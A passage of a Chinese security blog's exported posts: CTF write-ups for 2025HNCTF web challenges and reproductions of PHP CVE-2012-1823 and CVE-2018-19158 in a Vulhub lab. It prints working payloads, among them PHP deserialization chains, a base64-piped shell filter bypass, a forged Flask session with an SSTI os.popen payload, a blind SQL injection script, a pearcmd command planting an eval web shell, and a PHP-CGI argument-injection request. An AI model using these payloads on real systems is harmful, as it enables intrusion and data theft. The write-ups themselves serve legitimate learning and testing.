}\n\n}\n```\n\n\n\n","tags":["java反序列化"],"categories":["javasec"]},{"title":"2025HNCTF","url":"/2025/06/07/2025HNCTF/","content":"\n## ez_php\n\n```php\n<?php\nerror_reporting(0);\nclass GOGOGO{\n    public $dengchao;\n    function __destruct(){\n        echo \"Go Go Go~ 出发喽！\" . $this->dengchao;\n    }\n}\nclass DouBao{\n    public $dao;\n    public $Dagongren;\n    public $Bagongren;\n    function __toString(){\n        if( ($this->Dagongren != $this->Bagongren) && (md5($this->Dagongren) === md5($this->Bagongren)) && (sha1($this->Dagongren)=== sha1($this->Bagongren)) ){\n            call_user_func_array($this->dao, ['诗人我吃！']);\n        }\n    }\n}\nclass HeiCaFei{\n    public $HongCaFei;\n    function __call($name, $arguments){\n        call_user_func_array($this->HongCaFei, [0 => $name]);\n    }\n}\n\nif (isset($_POST['data'])) {\n    $temp = unserialize($_POST['data']);\n    throw new Exception('What do you want to do?');\n} else {\n    highlight_file(__FILE__);\n}\n?>\n```\n\n反序列化，先写链子\n\n```\nGOGOGO::__destruct()->DouBao::__toString()->HeiCaFei::__call\n```\n\n这里的话触发`__call`的方法很简单，先放poc\n\n```php\n<?php\nclass GOGOGO{\n    public $dengchao;\n}\nclass DouBao{\n    public $dao;\n    public $Dagongren=array([1]);\n    public $Bagongren=array([2]);\n}\nclass HeiCaFei{\n    public $HongCaFei;\n}\n$a = new GOGOGO();\n$a -> dengchao = new DouBao();\n$b = new HeiCaFei();\n$b -> HongCaFei = \"phpinfo\";\n$a -> dengchao -> dao = array($b, \"1\");\n```\n\n这里的话call_user_func_array会调用$d中的1函数，所以会触发`__call`，同时函数名就是传入`__call`的第一个参数$name，是可控的，那我们可以构造例如$name=ls的命令，然后让函数名也就是HongCaFei变量的值为system，这里还需要绕过GC回收机制，最终的poc\n\n```php\n<?php\nclass GOGOGO{\n    public $dengchao;\n}\nclass DouBao{\n    public $dao;\n    public $Dagongren=array([1]);\n    public $Bagongren=array([2]);\n}\nclass HeiCaFei{\n    public $HongCaFei;\n}\n$a = new GOGOGO();\n$a -> dengchao = new DouBao();\n$b = new HeiCaFei();\n$b -> HongCaFei = \"phpinfo\";\n$a -> dengchao -> dao = array($b, \"1\");\n$c = serialize(array($a, null));\n$d = str_replace(\"i:1;N;\",\"i:0;N;\",$c);\necho $d;\n```\n\n![image-20250607091019700](../image/achieve/202411/HNCTF/image-20250607091019700.png)\n\n成功执行，后面只需要改一下函数名和参数名就行了\n\n## Really_Ez_Rce\n\n```php\n<?php\nheader('Content-Type: text/html; charset=utf-8');\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nif (isset($_REQUEST['Number'])) {\n    $inputNumber = $_REQUEST['Number'];\n    \n    if (preg_match('/\\d/', $inputNumber)) {\n        die(\"不行不行,不能这样\");\n    }\n\n    if (intval($inputNumber)) {\n        echo \"OK,接下来你知道该怎么做吗\";\n        \n        if (isset($_POST['cmd'])) {\n            $cmd = $_POST['cmd'];\n            \n            if (!preg_match(\n                '/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\\\\\|more|cc|tac|less|head|\\.|\\{|\\}|uniq|copy|%|file|xxd|date|\\[|\\]|flag|bash|env|!|\\?|ls|\\'|\\\"|id/i',\n                $cmd\n            )) {\n                echo \"你传的参数似乎挺正经的,放你过去吧<br>\";\n                system($cmd);\n            } else {\n                echo \"nonono,hacker!!!\";\n            }\n        }\n    }\n}\n```\n\n第一个绕过很简单，用数组绕过就行了\n\n关键在于第二个传参执行命令，一开始是用变量拼接的，但是后面读文件的时候一直因为过滤`.`一直绕不过去，然后只能用编码绕过了\n\n```\ncmd=echo Y2F0IC9mbCo= | ba$9se64 -d | s$9h\nbmwgLyo= 是 cat /fl* 的base64编码\n```\n\n## 奇怪的咖啡店（复现）\n\n```python\nfrom flask import Flask, session, request, render_template_string, render_template\nimport json\nimport os\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = os.urandom(32).hex()\n\n@app.route('/', methods=['GET', 'POST'])\ndef store():\n    if not session.get('name'):\n        session['name'] = ''.join(\"customer\")\n        session['permission'] = 0\n\n    error_message = ''\n    if request.method == 'POST':\n        error_message = '<p style=\"color: red; font-size: 0.8em;\">该商品暂时无法购买，请稍后再试！</p>'\n\n    products = [\n        {\"id\": 1, \"name\": \"美式咖啡\", \"price\": 9.99, \"image\": \"1.png\"},\n        {\"id\": 2, \"name\": \"橙c美式\", \"price\": 19.99, \"image\": \"2.png\"},\n        {\"id\": 3, \"name\": \"摩卡\", \"price\": 29.99, \"image\": \"3.png\"},\n        {\"id\": 4, \"name\": \"卡布奇诺\", \"price\": 19.99, \"image\": \"4.png\"},\n        {\"id\": 5, \"name\": \"冰拿铁\", \"price\": 29.99, \"image\": \"5.png\"}\n    ]\n\n    return render_template('index.html',\n                         error_message=error_message,\n                         session=session,\n                         products=products)\n\n\ndef add():\n    pass\n\n\n@app.route('/add', methods=['POST', 'GET'])\ndef adddd():\n    if request.method == 'GET':\n        return '''\n            <html>\n                <body style=\"background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;\">\n                    <h2>添加商品</h2>\n                    <form id=\"productForm\">\n                        <p>商品名称: <input type=\"text\" id=\"name\"></p>\n                        <p>商品价格: <input type=\"text\" id=\"price\"></p>\n                        <button type=\"button\" onclick=\"submitForm()\">添加商品</button>\n                    </form>\n                    <script>\n                        function submitForm() {\n                            const nameInput = document.getElementById('name').value;\n                            const priceInput = document.getElementById('price').value;\n\n                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {\n                                method: 'POST',\n                                headers: {\n                                    'Content-Type': 'application/json',\n                                },\n                                body: nameInput\n                            })\n                            .then(response => response.text())\n                            .then(data => alert(data))\n                            .catch(error => console.error('错误:', error));\n                        }\n                    </script>\n                </body>\n            </html>\n        '''\n    elif request.method == 'POST':\n        if request.data:\n            try:\n                raw_data = request.data.decode('utf-8')\n                if check(raw_data):\n                #检测添加的商品是否合法\n                    return \"该商品违规，无法上传\"\n                json_data = json.loads(raw_data)\n\n                if not isinstance(json_data, dict):\n                    return \"添加失败1\"\n\n                merge(json_data, add)\n                return \"你无法添加商品哦\"\n\n            except (UnicodeDecodeError, json.JSONDecodeError):\n                return \"添加失败2\"\n            except TypeError as e:\n                return f\"添加失败3\"\n            except Exception as e:\n                return f\"添加失败4\"\n        return \"添加失败5\"\n\n\n\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\n\n\napp.run(host=\"0.0.0.0\",port=5014)\n```\n\n分析源码其实可以看得出来/add路由可以原型链污染，但是有过滤，看到这里有json.loads函数，可以用unicode编码绕过，污染`_static_folder`实现任意文件读取，将该配置指向根目录，从而可以读取根目录上开始的任意文件\n\n```\n{\"__globals__\" : {\"app\" : {\"_static_folder\" : \"/\"}}}\n```\n\n换成unicode编码\n\n```\n{\"\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\" : {\"\\u0061\\u0070\\u0070\" : {\"\\u005f\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063\\u005f\\u0066\\u006f\\u006c\\u0064\\u0065\\u0072\" : \"\\u002f\"}}}\n```\n\n![image-20250608173013743](../image/achieve/202411/HNCTF/image-20250608173013743.png)\n\n出现这个说明已经污染成功了，我们访问/static/app/app.py拿到最终源码\n\n```python\nfrom flask import Flask, session, request, render_template_string, render_template\nimport json\nimport os\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = os.urandom(32).hex()\n\n@app.route('/', methods=['GET', 'POST'])\ndef store():\n    if not session.get('name'):\n        session['name'] = ''.join(\"customer\")\n        session['permission'] = 0\n\n    error_message = ''\n    if request.method == 'POST':\n        error_message = '<p style=\"color: red; font-size: 0.8em;\">该商品暂时无法购买，请稍后再试！</p>'\n\n    products = [\n        {\"id\": 1, \"name\": \"美式咖啡\", \"price\": 9.99, \"image\": \"1.png\"},\n        {\"id\": 2, \"name\": \"橙c美式\", \"price\": 19.99, \"image\": \"2.png\"},\n        {\"id\": 3, \"name\": \"摩卡\", \"price\": 29.99, \"image\": \"3.png\"},\n        {\"id\": 4, \"name\": \"卡布奇诺\", \"price\": 19.99, \"image\": \"4.png\"},\n        {\"id\": 5, \"name\": \"冰拿铁\", \"price\": 29.99, \"image\": \"5.png\"}\n    ]\n\n    return render_template('index.html',\n                         error_message=error_message,\n                         session=session,\n                         products=products)\n\n\ndef add():\n    pass\n\n\n@app.route('/add', methods=['POST', 'GET'])\ndef adddd():\n    if request.method == 'GET':\n        return '''\n            <html>\n                <body style=\"background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;\">\n                    <h2>添加商品</h2>\n                    <form id=\"productForm\">\n                        <p>商品名称: <input type=\"text\" id=\"name\"></p>\n                        <p>商品价格: <input type=\"text\" id=\"price\"></p>\n                        <button type=\"button\" onclick=\"submitForm()\">添加商品</button>\n                    </form>\n                    <script>\n                        function submitForm() {\n                            const nameInput = document.getElementById('name').value;\n                            const priceInput = document.getElementById('price').value;\n\n                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {\n                                method: 'POST',\n                                headers: {\n                                    'Content-Type': 'application/json',\n                                },\n                                body: nameInput\n                            })\n                            .then(response => response.text())\n                            .then(data => alert(data))\n                            .catch(error => console.error('错误:', error));\n                        }\n                    </script>\n                </body>\n            </html>\n        '''\n    elif request.method == 'POST':\n        if request.data:\n            try:\n                raw_data = request.data.decode('utf-8')\n                if check(raw_data):\n                #检测添加的商品是否合法\n                    return \"该商品违规，无法上传\"\n                json_data = json.loads(raw_data)\n\n                if not isinstance(json_data, dict):\n                    return \"添加失败1\"\n\n                merge(json_data, add)\n                return \"你无法添加商品哦\"\n\n            except (UnicodeDecodeError, json.JSONDecodeError):\n                return \"添加失败2\"\n            except TypeError as e:\n                return f\"添加失败3\"\n            except Exception as e:\n                return f\"添加失败4\"\n        return \"添加失败5\"\n\n\n@app.route('/aaadminnn', methods=['GET', 'POST'])\ndef admin():\n    if session.get('name') == \"admin\" and session.get('permission') != 0:\n        permission = session.get('permission')\n        if check1(permission):\n            # 检测添加的商品是否合法\n            return \"非法权限\"\n\n        if request.method == 'POST':\n            return '<script>alert(\"上传成功！\");window.location.href=\"/aaadminnn\";</script>'\n\n        upload_form = '''\n        <h2>商品管理系统</h2>\n        <form method=POST enctype=multipart/form-data style=\"margin:20px;padding:20px;border:1px solid #ccc\">\n            <h3>上传新商品</h3>\n            <input type=file name=file required style=\"margin:10px\"><br>\n            <small>支持格式：jpg/png（最大2MB）</small><br>\n            <input type=submit value=\"立即上传\" style=\"margin:10px;padding:5px 20px\">\n        </form>\n        '''\n\n        original_template = 'Hello admin!!!Your permissions are{}'.format(permission)\n        new_template = original_template + upload_form\n\n        return render_template_string(new_template)\n    else:\n        return \"<script>alert('You are not an admin');window.location.href='/'</script>\"\n\n\n\n\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\n\ndef check(raw_data, forbidden_keywords=None):\n    \"\"\"\n    检查原始数据中是否包含禁止的关键词\n    如果包含禁止关键词返回 True，否则返回 False\n    \"\"\"\n    # 设置默认禁止关键词\n    if forbidden_keywords is None:\n        forbidden_keywords = [\"app\", \"config\", \"init\", \"globals\", \"flag\", \"SECRET\", \"pardir\", \"class\", \"mro\", \"subclasses\", \"builtins\", \"eval\", \"os\", \"open\", \"file\", \"import\", \"cat\", \"ls\", \"/\", \"base\", \"url\", \"read\"]\n\n    # 检查是否包含任何禁止关键词\n    return any(keyword in raw_data for keyword in forbidden_keywords)\n\n\nparam_black_list = ['config', 'session', 'url', '\\\\', '<', '>', '%1c', '%1d', '%1f', '%1e', '%20', '%2b', '%2c', '%3c', '%3e', '%c', '%2f',\n                    'b64decode', 'base64', 'encode', 'chr', '[', ']', 'os', 'cat',  'flag',  'set',  'self', '%', 'file',  'pop(',\n                    'setdefault', 'char', 'lipsum', 'update', '=', 'if', 'print', 'env', 'endfor', 'code', '=' ]\n\n\n# 增强WAF防护\ndef waf_check(value):\n    # 检查是否有不合法的字符\n    for black in param_black_list:\n        if black in value:\n            return False\n    return True\n\n# 检查是否是自动化工具请求\ndef is_automated_request():\n    user_agent = request.headers.get('User-Agent', '').lower()\n    # 如果是常见的自动化工具的 User-Agent，返回 True\n    automated_agents = ['fenjing', 'curl', 'python', 'bot', 'spider']\n    return any(agent in user_agent for agent in automated_agents)\n\ndef check1(value):\n\n    if is_automated_request():\n        print(\"Automated tool detected\")\n        return True\n\n    # 使用WAF机制检查请求的合法性\n    if not waf_check(value):\n        return True\n\n    return False\n\n\napp.run(host=\"0.0.0.0\",port=5014)\n```\n\n这里可以打ssti，因为可以进行原型链污染，那我们可以直接把`param_black_list`和`SECRET_KEY`污染掉，最后伪造cookie再打ssti就行了\n\n```\n{\"__globals__\" : {\"param_black_list\" : [\"1\"]}}\n{\"\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\" : {\"\\u0070\\u0061\\u0072\\u0061\\u006d\\u005f\\u0062\\u006c\\u0061\\u0063\\u006b\\u005f\\u006c\\u0069\\u0073\\u0074\" : [\"1\"]}}\n\n{\"__globals__\" : {\"app\" : {\"config\" : {\"SECRET_KEY\":\"123\"}}}}\n{\"\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\" : {\"\\u0061\\u0070\\u0070\" : {\"\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\" : {\"\\u0053\\u0045\\u0043\\u0052\\u0045\\u0054\\u005f\\u004b\\u0045\\u0059\":\"123\"}}}}\n```\n\n然后我们伪造session\n\n```\n{'name': 'admin', 'permission': '{{self.__init__.__globals__.__builtins__[\"__import__\"](\"os\").popen(\"ls /\").read()}}'}\n.eJwdisEJwzAMAFcpeiWhZICuEhejNEoQ2JKx3Jfx7lH7uzuug2AmeAEemQWeUKhmNmMVj70bpXONkYVbjA5X0h2T_Xn_cmosLlsAf3LR6leA9xRALcC8Fi0kbh9sj-VcfqkSHtM8BowbvmMq-g.aEUwzg.mBiuRSOKBMNSSPfGUTg8XAVIJT0\n```\n\n![image-20250608174000554](../image/achieve/202411/HNCTF/image-20250608174000554.png)\n\n## 半成品login（复现）\n\n一个登录口有弱口令admin/admin123\n\n![image-20250607092317469](../image/achieve/202411/HNCTF/image-20250607092317469.png)\n\n这个账号一直没爆出来，就返回登录口进行了测试，username只能输入字母和数字，所以压根打不进去，password的话过滤了单引号，但是用反斜杠转义的时候出现了报错，猜测这里应该还是可以sql注入的，但是一直没测出来\n\n来复现了，测了一下发现双重urlencode可以绕过，那我们测一下注入点\n\n```\nusername=admin&password=admin123%2527#\n这个是在抓包后的，如果是在web页面的话是\nusername=admin&password=admin123%27#\n```\n\n![image-20250608170755471](../image/achieve/202411/HNCTF/image-20250608170755471.png)\n\n这里过滤了select，但是可以注意到php的版本是8.2.28，想起了之前战队面试的时候刚好问到一个php8的sql注入的新特性，就是可以用table代替select进行查询数据\n\n放个师傅的脚本\n\n```python\nimport requests\nimport time\n\n\ndict = '0123456789'\nfor i in range(ord('a'),ord('z')+1):\n    dict += chr(i)\n\n\nburp0_url = \"http://27.25.151.198:31763/login.php\"\n\nburp0_cookies = {\"PHPSESSID\": \"292edf1013fa3e34a5c333e5f526d13a\"}\nburp0_headers = {\"Cache-Control\": \"max-age=0\", \"Origin\": \"http://27.25.151.198:31240\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\", \"Referer\": \"http://27.25.151.198:31240/index.php\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Connection\": \"close\"}\n\n\n# 库名\ndef database():\n    res = ''\n    for _ in range(100):\n        flag = 1\n        for i in range(len(dict)):\n            # time.sleep(0.1)\n            tmp = res + dict[i]\n            burp0_data = {\"username\": \"admin\", \"password\": f\"admin123%27and/**/(table/**/information_schema.schemata/**/limit/**/4,1)>=(\\\"def\\\",\\\"{tmp}\\\",3,4,5,6)#\"}\n            r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text\n            if 'welcome.php' not in r:\n                res += dict[i-1]\n                flag = 0\n                print(res)\n                break\n        if flag == 1:\n            break\n\ndef tables():\n    res = ''\n    for _ in range(100):\n        flag = 1\n        for i in range(len(dict)):\n            # time.sleep(0.1)\n            tmp = res + dict[i]\n            burp0_data = {\"username\": \"admin\", \"password\": f'admin123%27and/**/(\"def\",\"hnctfweb\",\"{tmp}\",\"\",5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)<=(table/**/information_schema.tables/**/limit/**/329,1)#'}\n            r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text\n            # print(r)\n            if 'welcome.php' not in r:\n                res += dict[i-1]\n                flag = 0\n                print(res)\n                break\n        if flag == 1:\n            break\n\ndef data_username():\n    res = 'hacker'\n    for _ in range(5):\n        flag = 1\n        for i in range(len(dict)):\n            # time.sleep(0.1)\n            tmp = res + dict[i]\n            burp0_data = {\"username\": \"admin\", \"password\": f'admin123%27and/**/(2,\"{tmp}\",\"\",\"\")/**/<=/**/(table/**/hnctfweb.hnctfuser/**/limit/**/1,1)#'}\n            r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text\n            # print(r)\n            if 'welcome.php' not in r:\n                res += dict[i-1]\n                flag = 0\n                print(res)\n                break\n        if flag == 1:\n            break\n\ndef data_password(username):\n    res = ''\n    for _ in range(100):\n        flag = 1\n        for i in range(len(dict)):\n            # time.sleep(0.1)\n            tmp = res + dict[i]\n            burp0_data = {\"username\": \"admin\", \"password\": f'admin123%27and/**/(2,\"{username}\",\"{tmp}\",\"\")/**/<=/**/(table/**/hnctfweb.hnctfuser/**/limit/**/1,1)#'}\n            r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text\n            # print(r)\n            if 'welcome.php' not in r:\n                res += dict[i-1]\n                flag = 0\n                print(res)\n                break\n        if flag == 1:\n            break\n\n\n# hnctfweb\n# database()\n\n# 329\n# hnctfuser\n# tables()\n\n\n# data_username()\n# hackernbvag, d8578edf845\ndata_password('hackernbvag')\n\n```\n\n最后拿到账号密码\n\n```\nhackernbvag,d8578edf845\n```\n\n登录进去就拿到flag了\n\n## DeceptiFlag\n\n在元素中发现有隐藏的输入框\n\n![image-20250607130130480](../image/achieve/202411/HNCTF/image-20250607130130480.png)\n\n并且抓包后也是可以看到还需要一个参数的\n\n![image-20250608162310122](../image/achieve/202411/HNCTF/image-20250608162310122.png)\n\n将none改成inline后出现另一个框框，根据画面有喜羊羊和灰太狼，分别传入xiyangyang和huitailang后跳转\n\n![image-20250607130228914](../image/achieve/202411/HNCTF/image-20250607130228914.png)\n\n有一个file参数或许可以打文件包含，尝试读取/etc/passwd但是没出，提示Trying to include files from root directory huh，难道是目录遍历？\n\n但是后面一直没打出来\n\n![image-20250608124154539](../image/achieve/202411/HNCTF/image-20250608124154539.png)\n\n通过报错可以知道用了`require_once`，且强制拼接了`.php`后缀\n\n![image-20250608124254221](../image/achieve/202411/HNCTF/image-20250608124254221.png)\n\n用filter过滤器成功读出来，那我们读一下tips.php的源码\n\n```php\n?file=php://filter/read=convert.base64-encode/resource=tips.php\n```\n\n```php\n<?php\nsession_start();\n\n// 为 PHP 7 添加 str_starts_with 函数兼容支持\nif (!function_exists('str_starts_with')) {\n    function str_starts_with($haystack, $needle) {\n        return strpos($haystack, $needle) === 0;\n    }\n}\n\nif (!isset($_SESSION['verified']) || $_SESSION['verified'] !== true) {\n    header(\"Location: aicuo.php\");\n    exit();\n}\n\nif (!isset($_GET['file'])) {\n    header('Location: ?file=flag');\n    exit();\n}\n\n$file = trim($_GET['file']);\n\nif (preg_match('/\\s/', $file)) {\n    die('Trying to use space huh?');\n}\nif (preg_match('/\\.\\./', $file)) {\n    die('Trying to include files from parent directory huh?');\n}\nif (preg_match('/^\\//', $file) && !str_starts_with($file, 'php://filter')) {\n    die('Trying to include files from root directory huh?');\n}\n\nif (str_starts_with($file, 'php://filter')) {\n    $content = @file_get_contents($file);\n    if ($content === false) {\n        die('无法读取文件');\n    }\n    echo $content;\n    exit();\n}\n\nrequire_once $file . '.php';\n```\n\n这里利用php8的一个函数str_starts_with检测开头是否是`php://filter`，后面就是一些正则，不能以`/`开头，也不能出现`..`和空格，这样的话目录遍历打不了了，该怎么读文件呢？\n\n不过后面在cookie中看到一个hint\n\n![image-20250608163234341](../image/achieve/202411/HNCTF/image-20250608163234341.png)\n\n解码后是/var/flag/flag.txt，啊？这就直接给路径了？一直没做出来，也没注意看\n\n后面想起来用pearcmd也能打，直接写马\n\n```\n?+config-create+/&file=file:///usr/local/lib/php/pearcmd&/<?=@eval($_POST[%27cmd%27]);?>+test.php\n```\n\n然后访问RCE就行了\n\n## Watch（复现）\n\n![image-20250608164150121](../image/achieve/202411/HNCTF/image-20250608164150121.png)\n\n从源码中可以看到这里进行了一个路径的拼接，意味着可能存在目录遍历漏洞，后面找出题人问了思路发现是一个https://pkg.go.dev/vuln/GO-2023-2185\n\n![image-20250608164701700](../image/achieve/202411/HNCTF/image-20250608164701700.png)\n\n```\nilepath 包无法将以 \\??\\ 为前缀的路径识别为特殊路径。在 Windows 上，以 \\??\\ 开头的路径是根本地设备路径，相当于以 \\\\?\\ 开头的路径。以 \\??\\ 为前缀的路径可用于访问系统上的任意位置。例如，路径 \\??\\c:\\x 相当于更常见的路径 c:\\x。修复之前，Clean 可以将根路径（例如 \\a\\..\\??\\b）转换为根本地设备路径 \\??\\b。现在，Clean 会将其转换为 .\\??\\b。同样，Join(\\, ??, b) 可以将看似无害的路径元素序列转换为根本地设备路径 \\??\\b。现在，Join 会将其转换为 \\.\\??\\b。此外，修复后，IsAbs 现在可以正确地将以 \\??\\ 开头的路径报告为绝对路径，VolumeName 可以正确地将 \\??\\ 前缀报告为卷名。更新：Go 1.20.11 和 Go 1.21.4 无意中更改了以 \\? 开头的 Windows 路径中卷名的定义，导致 filepath.Clean(\\?\\c:) 返回 \\?\\c: 而不是 \\?\\c:\\（以及其他影响）。之前的行为已恢复。\n```\n\n![image-20250608165812275](../image/achieve/202411/HNCTF/image-20250608165812275.png)\n\n然后读取key\n\n![image-20250608165843789](../image/achieve/202411/HNCTF/image-20250608165843789.png)\n\n提交key就能拿到flag了\n","tags":["2024HNCTF"],"categories":["赛题wp"]},{"title":"CVE-2012-1823漏洞复现","url":"/2025/06/06/CVE-2012-1823漏洞复现/","content":"\n## 漏洞信息\n\n## 0x01漏洞介绍\n\n一个PHP-CGI远程代码执行漏洞\n\n![image-20250606181114454](../image/achieve/202411/CVE复现/image-20250606181114454.png)\n\n我们先看一下修复版本修复了什么\n\n![image-20250606182029967](../image/achieve/202411/CVE复现/image-20250606182029967.png)\n\n修复了PHP-CGI查询字符串参数的漏洞，并指明了CVE的序列号，也就是我们现在要复现的漏洞\n\n这个的话跟源码有关，我们去找一下漏洞版本的源码看一下，我这里下载的是5.3.11版本的，首先我们先了解一下PHP的运行模式\n\n### PHP运行模式\n\nPHP的运行模式主要是由SAPI决定的，我们最熟悉的就是cli模式以及cgi模式了\n\n先讲讲**cgi模式**\n\nCGI模式是指旧时代web容器接收到http数据包后，拿到用户请求的文件（cgi脚本），并fork出一个子进程（解释器）去执行这个文件，然后拿到执行结果，直接返回给用户，同时这个解释器子进程也就结束了，特点就是每次请求都需要启动一个子进程，性能较差\n\n然后我们讲讲现代web应用较为推荐的一种模式也就是php-FPM模式\n\nphp-FPM模式是通过FastCGI协议与web服务器进行通信的，而PHP-FPM 是 PHP 的 FastCGI 进程管理器，用于管理 PHP 进程池。其特点就是进程池管理、高并发、低资源占用，可以完全代替之前CGI模式\n\n### 关于SAPI\n\n下载PHP源码，可以看到其中有个目录叫sapi。sapi在PHP中的作用，类似于一个消息的“传递者”，是PHP的核心接口，用于定义PHP如何与外部环境交互的。而不同的sapi决定了PHP的运行方式，其中php-cgi也是一种sapi，他的功能有两个，一个是提供cgi方式的交互，另一个是提供fastcgi方式的交互，PHP-CGI可以fork出一个子进程，让解释器执行这个文件，也可以将进程常驻后台，执行后返回结果。\n\n然后我们看漏洞源码\n\n### 漏洞源码\n\n在 `sapi/cgi/cgi_main.c` 文件中，以下代码片段负责处理 `QUERY_STRING`\n\n```c\nif ((query_string = getenv(\"QUERY_STRING\")) != NULL && *query_string) {\n    if (php_cgi_parse_query_string(query_string, &argc, &argv) == FAILURE) {\n        return FAILURE;\n    }\n}\n```\n\n- 这里的话会从环境变量中获取QUERY_STRING的值（即请求中?号后的部分例如index.php?a=1中的a=1），并返回一个字符串指针\n- 然后会检查 `query_string` 是否非空（`NULL`）且第一个字符不是 `\\0`（空字符）。\n- 之后会将`QUERY_STRING` 解析为命令行参数（类似 `main(int argc, char **argv)` 的格式）。\n\n### 漏洞原理\n\n简单来说，就是用户请求的`querystring`被作为了`php-cgi`的参数，最终导致了可以利用参数进行攻击\n\n## 0x02影响版本\n\n**php < 5.3.12 or php < 5.4.2**\n\n## 环境搭建&漏洞利用\n\n### 环境搭建\n\n我们先启动靶场环境，在/vulhub/php/CVE-2012-1823中\n\n```\ndocker-compose up -d\n```\n\n![image-20250606184619416](../image/achieve/202411/CVE复现/image-20250606184619416.png)\n\n看一下docker文件，是8080端口，访问8080端口\n\n![image-20250606184737993](../image/achieve/202411/CVE复现/image-20250606184737993.png)\n\n然后我们开始复现\n\n在cgi模式下有如下一些参数可用：\n\n- -c 指定php.ini文件的位置\n- -n 不要加载php.ini文件\n- -d 指定配置项\n- -b 启动fastcgi进程\n- -s 显示文件源码\n- -T 执行指定次该文件\n- -h和-? 显示帮助\n\n### 漏洞利用\n\n1.最简单的就是获取源码了，也就是用-s参数显示文件源码\n\n之前也分析过漏洞点了，那我们尝试获取一下index.php的源码，用-s参数\n\n![image-20250606185011285](../image/achieve/202411/CVE复现/image-20250606185011285.png)\n\n2.第二个就是可以打任意文件包含的漏洞，用-d参数指定php配置项例如使用`-d`指定`auto_prepend_file`\n\n```\n-d allow_url_include=on -d auto_prepend_file=php://input\n```\n\n使用`-d`参数可以配合`php.ini`中的配置文件打文件包含\n\n- `allow_url_include`: 允许包含远程机器的文件，这个需要打开，不然没法打文件包含\n- `auto_prepend_file`: 页面顶部加载的内容\n- `auto_append_file`: 页面底部加载的内容\n- `php://input`: 通过`POST`方式提交数据，这里运用的很巧妙，使用`post`方式提交需要包含的PHP代码\n\n我们抓包试一下\n\n```\nGET /?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp%3A%2F%2Finput HTTP/1.1\nHost: 38.55.99.239:8080\nAccept-Language: zh-CN,zh;q=0.9\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\n\n<?php phpinfo();?>\n```\n\n放包后\n\n![image-20250606185503914](../image/achieve/202411/CVE复现/image-20250606185503914.png)\n\n所以也可以直接执行命令\n\n![image-20250606185634434](../image/achieve/202411/CVE复现/image-20250606185634434.png)\n\n当然我们也可以打远程包含，这里就不演示了\n\n也可以通过包含/proc/self/environ本地文件进行远程代码执行\n\n修改`User-Agent`为PHP代码，查看`HTTP_USER_AGENT`值\n\n![image-20250606190013565](../image/achieve/202411/CVE复现/image-20250606190013565.png)\n\n至此漏洞利用完成\n","tags":["漏洞复现"],"categories":["CVE"]},{"title":"CVE-2018-19158漏洞复现","url":"/2025/06/06/CVE-2018-19158漏洞复现/","content":"\n## 漏洞信息\n\n### 0x01漏洞介绍\n\nCVE-2018-19158是PHP imap 远程命令执行漏洞\n\nphp imap扩展用于在PHP中执行邮件收发操作。**PHP IMAP 扩展** 允许 PHP 脚本通过 **IMAP（Internet Message Access Protocol）、POP3（Post Office Protocol 3）或 NNTP（Network News Transfer Protocol）** 协议与邮件服务器交互。\n\n举个例子\n\n连接邮箱到服务器\n\n```php\n$host = '{imap.example.com:993/imap/ssl}INBOX'; // IMAP 服务器地址\n$user = 'user@example.com'; // 邮箱账号\n$pass = 'password'; // 邮箱密码\n\n// 连接到邮箱\n$imap = imap_open($host, $user, $pass);\nif (!$imap) {\n    die('连接失败: ' . imap_last_error());\n}\n\n// 获取邮箱中的邮件数量\n$total_emails = imap_num_msg($imap);\necho \"共有 {$total_emails} 封邮件\";\n\n```\n\n我们介绍一下imap_open函数\n\n```php\nimap_open(\n    string $mailbox,\n    string $user,\n    string $password,\n    int $flags = 0,\n    int $retries = 0,\n    array 